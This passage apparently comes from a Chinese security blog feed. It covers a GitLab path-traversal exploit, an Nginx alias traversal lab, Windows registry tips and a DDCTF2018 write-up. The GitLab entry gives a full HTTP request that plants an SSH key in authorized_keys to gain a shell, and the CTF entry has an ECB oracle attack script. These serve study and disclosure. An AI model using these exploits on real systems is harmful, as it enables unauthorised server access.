qR2JSglo1LRYoLxJnJp2koMVG0OdJ1p9DAKAohdNSw91DagaTswKVGvNjltF5oq0Kd72w401X9Hf1TaXeXftmFHxdhuW+u0fvc+nZ/0gKf9RneZt6JUnzZVtYd92qd9xCjruuDbWh11XgAAAAAAgBNY6iwVypQELJa3WUM1l6vYbpAwshRhrSo6XAIxXuMyM1SW41m3td5yM5CaqRnethJ7CAHErtrTII0OVPX9tEbs+HmwDUVVzVNiw25lfCww/Yv66O6Itxm34bQ3aC+T9e021YuDYm03imXP3axv7xhuvxQmsIx5SUr0ZR7SlS//RSOSAvOa7pFgwLLNuj6WJLlVmuf98y/SyC+GzQ8AAAAAAHBiildWSY02FNYrx1OdeOzEOmXa7Ro6bRMWTAxMq5A6XALRNHlYEr7uidbydjAyVfkbClWfE1iv6XK7/RKVAa0Wt/+oOnTokNvXNec8OEWnJA51h3qX/WbjQVVu1d6+0xvbPVrHYhxu3Ks3vvKEOwQAAAAAAHDs2rlzpxISojQ82M81NTVRAvHE5r6lOVp1ZgAAAAAAAMBCAPGENFmrs0w15C8q48D/xqwCDQAAAAAAgBMbVZhx1FCFGQAAAAAAHC+owgwAAAAAAAAAURBABAAAAAAAAOCLACIAAAAAAAAAXwQQAQAAAAAAAPgigAgAAAAAAADAV78JII5835lqPXTEHcKxzpyrEaed4Q4BAAAAAAAc204++WQdOnTIHToxmOM1x91vAog3ffRavbenhSDiccCcI3Oubhh9tTsGAAAAAADg2DZ48GDt2bPnhAkimuM0x2uOe0CrxR1/VPVE4v+g+jGV/WW9dvznLXcMjkWmtOiNo6/R19NvdMcAAAAAAAAc+9599127O3Kk/xdgMyUPTfCw3wUQAQAAAAAAAPQsXqICAAAAAAAAwBcBRAAAAAAAAAC+CCACAAAAAAAA8EUAEQAAAAAAAIAvAogAAAAAAAAAfBFABAAAAAAAAOCLACIAAAAAAAAAXwQQAQAAAAAAAPgigAgAAAAAAADAFwFEAAAAAAAAAL4IIAIAAAAAAADwRQARAAAAAAAAgC8CiAAAAAAAAAB8EUAEAAAAAAAA4IsAIgAAAAAAAABfA1otbj8AAAAAAAAAhKEEIgAAAAAAAABfBBABAAAAAAAA+CKACAAAAAAAAMAXAUQAAAAAAAAAvgggAgAAAAAAAPBFABEAAAAAAACALwKIAAAAAAAAAHwRQAQAAAAAAADgiwAiAAAAAAAAAF8EEAEAAAAAAAD4IoAIAAAAAAAAwBcBRAAAAAAAAAC+CCACAAAAAAAA8EUAEQAAAAAAAIAvAogAAAAAAAAAfBFABAAAAAAAAOCLACIAAAAAAAAAXwQQAQAAAAAAAPgigAgAAAAAAADAFwFEAAAAAAAAAL4IIAIAAAAAAADwRQARAAAAAAAAgC8CiAAAAAAAAAB8EUAEAAAAAAAA4IsAIgAAAAAAAABfBBABAAAAAAAA+CKACAAAAAAAAMAXAUQAAAAAAAAAvgggAgAAAAAAAPAh/X+OE/yZG+ArmQAAAABJRU5ErkJggg==" alt="image"></li><li><p>然后选择前面ssh-keygen生成的<strong>公钥</strong>（注意是公钥）</p></li><li><p>点击import project 后，burp修改path的值为<code>/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys</code>,数据包如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/import/gitlab_project</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.100</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------20787582420424</span><br><span class="line"><span class="attribute">Content-Length</span>: 1214</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.1.100/import/gitlab_project/new?namespace_id=2&amp;path=</span><br><span class="line"><span class="attribute">Cookie</span>: _gitlab_session=9c5f21dbfe98d90b1d992e1c9907584c; sidebar_collapsed=false</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------20787582420424</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="utf8"</span><br><span class="line"></span><br><span class="line">â</span><br><span class="line">-----------------------------20787582420424</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="authenticity_token"</span><br><span class="line"></span><br><span class="line">JoWtToPxTJL6RVASaprnR1hRqEGARnbLkA06favQLxQ7Y7YtyqfE9+JsbV/NAwy7XAdTuzgRsxJ/Kl1hH9V6xA==</span><br><span class="line">-----------------------------20787582420424</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="namespace_id"</span><br><span class="line"></span><br><span class="line">&#123;:value=&gt;2&#125;</span><br><span class="line">-----------------------------20787582420424</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="path"</span><br><span class="line"></span><br><span class="line"><span class="attribute">ssh/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys</span></span><br><span class="line"><span class="attribute">-----------------------------20787582420424</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="namespace_id"</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">-----------------------------20787582420424</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="id_rsa.pub"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/vnd.ms-publisher</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+McaRvLdnm+u30cACV4ftHJUESNVNV/VNlwm5xST343cFQODjBua5ffpCgDIejiVhyz9BzMmmynN5tnN6JQlx4SwSGkuR3+wzbJ8XKJNHLpOeZ2Xzw+UA9duDinDQHUklFwDmjH7Pywy6kRurIWXTsdupkLrHobEjSjrwEkqvLUnRi1EA/nU5es+kEz6c04jDUrZoGaj5GiI7VYReX+d9Pm524H9KfBpFIZ27yaWs1lR9b+dXjbXnUdysKdWTQcwy1tv+xhEbwF9m/PQajAEPPl95u/qrGPMqT0l08dC6H9o50i9Yn0Yf3t946g4QjGBs+GZgaNoLda8d5U5S8XLz BF@DESKTOP-4UM7GF4</span><br><span class="line"></span><br><span class="line">-----------------------------20787582420424--</span><br></pre></td></tr></table></figure></li><li><p>发送请求后，使用用户名git以及生成的私钥登录gitlab服务器，如下是执行命令的demo</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line"><span class="attribute">uid</span>=998(git) <span class="attribute">gid</span>=998(git) <span class="attribute">groups</span>=998(git)</span><br></pre></td></tr></table></figure></li></ol><h3 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h3><p><a href="https://about.gitlab.com/2018/01/16/gitlab-10-dot-3-dot-4-released/" target="_blank" rel="noopener">https://about.gitlab.com/2018/01/16/gitlab-10-dot-3-dot-4-released/</a><br><a href="https://hackerone.com/reports/298873" target="_blank" rel="noopener">https://hackerone.com/reports/298873</a></p>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gitlab </tag>
            
            <tag> RCE </tag>
            
            <tag> 目录遍历 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nginx错误配置alias导致目录遍历漏洞</title>
      <link href="/2018/05/23/Nginx_alias_misconfig_path_traversle/"/>
      <url>/2018/05/23/Nginx_alias_misconfig_path_traversle/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。<br><a id="more"></a></p><h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><ul><li><p>使用richarvey/nginx-php-fpm镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p 80:80  richarvey/nginx-php-fpm</span></span><br></pre></td></tr></table></figure></li><li><p>配置nginx，添加配置test路由解析到<code>/var/www/html/</code>路径（注意：/test没有结尾的<code>/</code>）</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/sites-available/default.conf</span></span><br><span class="line"><span class="keyword">location</span> <span class="title">/test</span> &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">|--var</span></span><br><span class="line">   <span class="string">|--www</span></span><br><span class="line">      <span class="string">|--flag.txt</span></span><br><span class="line">      <span class="string">|--html</span></span><br><span class="line">         <span class="string">|--index.php</span></span><br><span class="line">         <span class="string">|--test.txt</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><ul><li><p>通过访问<a href="http://127.0.0.1/test/test.txt" target="_blank" rel="noopener">http://127.0.0.1/test/test.txt</a><br>可以成功访问到test的内容如下(<code>/test/test.txt</code>路由请求，经处理后转换成：<code>/var/www/html/test.txt</code>)：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> a test</span><br></pre></td></tr></table></figure></li><li><p>修改请求为<a href="http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)" target="_blank" rel="noopener">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you <span class="keyword">get</span> <span class="keyword">me</span>, hahaha</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结:"></a>0x03小结:</h3><ul><li>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</li><li>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</li><li>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</li></ul><h3 id="0x04参考链接："><a href="#0x04参考链接：" class="headerlink" title="0x04参考链接："></a>0x04参考链接：</h3><ul><li><a href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md" target="_blank" rel="noopener">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a></li><li><a href="https://hackerone.com/reports/317201" target="_blank" rel="noopener">https://hackerone.com/reports/317201</a></li><li><a href="https://hackerone.com/reports/312510" target="_blank" rel="noopener">https://hackerone.com/reports/312510</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> 目录遍历 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Win10下常用的修改注册表Tips</title>
      <link href="/2018/05/07/win10_reg_cmd_bash_ipsec/"/>
      <url>/2018/05/07/win10_reg_cmd_bash_ipsec/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><ol><li>Win10快速右键添加“在此处打开CMD”以及安装了ubuntu子系统或者Kali子系统的情况下，右键添加“在此处打开Bash”</li><li>解决Win10连接IPsec VPN报错问题。<a id="more"></a></li></ol><h3 id="0x01-Win10右键添加“在此处打开CMD”"><a href="#0x01-Win10右键添加“在此处打开CMD”" class="headerlink" title="0x01 Win10右键添加“在此处打开CMD”"></a>0x01 Win10右键添加“在此处打开CMD”</h3><p>保存以下代码为<a href="http://www.blackwolfsec.cc/static/code/cmd.reg" target="_blank" rel="noopener">cmd.reg</a>,然后点击运行即可<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\<span class="keyword">shell</span><span class="bash">\open_cmd]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open CMD Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\shell\open_cmd\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"cmd.exe /s /k pushd \"%V\""</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd]</span></span><br><span class="line"><span class="bash">@=<span class="string">"在此处打开CMD窗口"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash"><span class="string">"Icon"</span>=<span class="string">"cmd.exe"</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"cmd.exe /s /k pushd \"%V\""</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Drive\shell\open_cmd]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_cmd]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open CMD Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_cmd\<span class="built_in">command</span>]</span></span><br></pre></td></tr></table></figure></p><h3 id="0x02-Win10右键添加“在此处打开Bash”"><a href="#0x02-Win10右键添加“在此处打开Bash”" class="headerlink" title="0x02 Win10右键添加“在此处打开Bash”"></a>0x02 Win10右键添加“在此处打开Bash”</h3><p><em>ps:前提是安装了Win10的ubuntu子系统或者Kali子系统</em></p><p>保存以下代码为<a href="http://www.blackwolfsec.cc/static/code/bash.reg" target="_blank" rel="noopener">bash.reg</a>,然后点击运行即可<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\<span class="keyword">shell</span><span class="bash">\open_bash]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open Bash Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\shell\open_bash\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"bash.exe"</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash]</span></span><br><span class="line"><span class="bash">@=<span class="string">"在此处打开Bash窗口"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash"><span class="string">"Icon"</span>=<span class="string">"bash.exe"</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"bash.exe"</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Drive\shell\open_bash]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_bash]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open Bash Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_bash\<span class="built_in">command</span>]</span></span><br></pre></td></tr></table></figure></p><h3 id="0x03-Win10解决IPsecVPN连接报错问题"><a href="#0x03-Win10解决IPsecVPN连接报错问题" class="headerlink" title="0x03 Win10解决IPsecVPN连接报错问题"></a>0x03 Win10解决IPsecVPN连接报错问题</h3><p>ps:适用于：Windows Vista, 7, 8, 10, and 2008 Server:<br><strong>报错信息</strong>：</p><p><em>无法建立计算机与 VPN服务器之间的网络连接，因为远程服务器未响应。这可能是因为未将计算机与远程服务器之间的某种网络设备(如防火墙、NAT、路由器等)配置为容许 VPN 连接。请与管理员或服务供给商联系以确定哪种设备可能产生此问题</em></p><p><strong>解决办法</strong>：<br>保存如下代码为<a href="http://www.blackwolfsec.cc/static/code/ipsec.reg" target="_blank" rel="noopener">ipsec.reg</a>，然后双击运行即可<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00   </span><br><span class="line">[HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\S</span>ervices<span class="symbol">\P</span>olicyAgent]   </span><br><span class="line">"AssumeUDPEncapsulationContextOnSendRule"=dword:00000002</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> VPN </tag>
            
            <tag> IPsec </tag>
            
            <tag> CMD </tag>
            
            <tag> Bash </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DDCTF2018 部分WriteUP</title>
      <link href="/2018/04/20/DDCTF2018/"/>
      <url>/2018/04/20/DDCTF2018/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近参加DDCTF2018，记录其中两个题的WriteUp<br><a id="more"></a></p><h3 id="1-第四扩展FS"><a href="#1-第四扩展FS" class="headerlink" title="1. 第四扩展FS"></a>1. 第四扩展FS</h3><p>题目给了一张图片，用foremost提取出一张图片和加密的zip压缩包，爆破解压密码许久都没有成功，用EmEditor打开看到有字符串：Pactera，成功解压压缩包，然后根据提示需要统计字符出现次数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">f=open(<span class="string">"file.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">print(Counter(f.readlines()[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line">Counter(&#123;<span class="string">'D'</span>: <span class="number">3950</span>, <span class="string">'C'</span>: <span class="number">1900</span>, <span class="string">'T'</span>: <span class="number">1850</span>, <span class="string">'F'</span>: <span class="number">1800</span>, <span class="string">'&#123;'</span>: <span class="number">1750</span>, <span class="string">'h'</span>: <span class="number">1700</span>, <span class="string">'u'</span>: <span class="number">1650</span>, <span class="string">'a'</span>: <span class="number">1600</span>, <span class="string">'n'</span>: <span class="number">1550</span>, <span class="string">'w'</span>: <span class="number">1500</span>, <span class="string">'e'</span>: <span class="number">1450</span>, <span class="string">'1'</span>: <span class="number">1400</span>, <span class="string">'s'</span>: <span class="number">1350</span>, <span class="string">'i'</span>: <span class="number">1300</span>, <span class="string">'k'</span>: <span class="number">1250</span>, <span class="string">'4'</span>: <span class="number">1200</span>, <span class="string">'o'</span>: <span class="number">1150</span>, <span class="string">'!'</span>: <span class="number">1100</span>, <span class="string">'&#125;'</span>: <span class="number">1050</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>得到flag:DDCTF{huanwe1sik4o!}</p><h3 id="2-安全通信"><a href="#2-安全通信" class="headerlink" title="2. 安全通信"></a>2. 安全通信</h3><p>该题使用ECB(电子密码本模式)进行加密，由于分组模式中ECB模式相同的明文分组，会得到相同密文输出。</p><p>根据这个特性，以爆破第一位为例，构造输入Agent ID 为45个1，加密消息为：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection <span class="keyword">for</span> mission: ID为<span class="number">111111111111111111111111111111111111111111111</span>, your mission<span class="symbol">'s</span> flag <span class="keyword">is</span>: D</span><br></pre></td></tr></table></figure></p><p>然后加上Flag的第一位，构成96（16*6）个字符长度输入，截取密文的前192（32*6）。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Please enter mission key:</span><br><span class="line">b9ba15b341c847c8beba85273f9b7f90</span><br><span class="line"><span class="comment">#Agent ID为45个1</span></span><br><span class="line">Please enter your Agent ID <span class="keyword">to</span> secure communications:</span><br><span class="line"><span class="comment">#返回的欢迎加密信息，取前192位作为判断</span></span><br><span class="line"><span class="number">111111111111111111111111111111111111111111111</span></span><br><span class="line">ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf17888d387e8b7756e9a3de2a68b4fbf726b43ef60ec00ce6bfbdf91d4d9dba79bb2983e79315def49a0fa8eaa10cd4a8250e53382d70f71936a32961d5741662</span><br><span class="line"></span><br><span class="line">Please send <span class="keyword">some</span> messages <span class="keyword">to</span> be encrypted, 'quit' <span class="keyword">to</span> <span class="keyword">exit</span>:</span><br><span class="line"><span class="comment">#猜测第一位为C</span></span><br><span class="line">Connection <span class="keyword">for</span> mission: <span class="number">111111111111111111111111111111111111111111111</span>, your mission's flag <span class="keyword">is</span>: C</span><br><span class="line">ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf18c2aed45181d467f22c858da3d1b03b</span><br><span class="line">Please send <span class="keyword">some</span> messages <span class="keyword">to</span> be encrypted, 'quit' <span class="keyword">to</span> <span class="keyword">exit</span>:</span><br><span class="line"><span class="comment">#猜测第一位为D</span></span><br><span class="line">Connection <span class="keyword">for</span> mission: <span class="number">111111111111111111111111111111111111111111111</span>, your mission's flag <span class="keyword">is</span>: D</span><br><span class="line">ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf17888d387e8b7756e9a3de2a68b4fbf7</span><br><span class="line">Please send <span class="keyword">some</span> messages <span class="keyword">to</span> be encrypted, 'quit' <span class="keyword">to</span> <span class="keyword">exit</span>:</span><br></pre></td></tr></table></figure></p><p>当输入的最后一位为D时，加密结果和欢迎消息密文的前192位结果相同。接下来爆破Flag的第二位时，将Agent ID位数减1（44位）。依次递增Flag位数，同时递减Agent ID位数即可爆破出Flag，写个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Connection for mission: 111111111111111111111111111111111111111111111, your mission's flag is: D</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">mission_key=<span class="string">"b9ba15b341c847c8beba85273f9b7f90"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">payloads = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz.@_-&#125;&#123;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    r = remote(<span class="string">'116.85.48.103'</span>, <span class="number">5002</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter mission key:"</span>)</span><br><span class="line">    r.sendline(mission_key)</span><br><span class="line">    mission_len=<span class="number">45</span>-i</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>*mission_len)</span><br><span class="line">    data_1=r.recvuntil(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>).strip()[:<span class="number">192</span>]</span><br><span class="line">    <span class="comment">#print data_1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">    name=<span class="string">"1"</span>*mission_len</span><br><span class="line">    flag_buf=flag+j</span><br><span class="line">    message = <span class="string">"Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;"</span>.format(name, flag_buf)</span><br><span class="line">    <span class="comment">#print message</span></span><br><span class="line">    r.sendline(message)</span><br><span class="line">        data_2=r.recvuntil(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>).strip()[:<span class="number">192</span>]</span><br><span class="line">        <span class="comment">#print data_2</span></span><br><span class="line">        <span class="keyword">if</span> data_1==data_2:</span><br><span class="line">        flag=flag+j</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">        r.sendline(<span class="string">"quit"</span>)</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'&#125;'</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">……</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b7</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b74</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b74d8</span><br><span 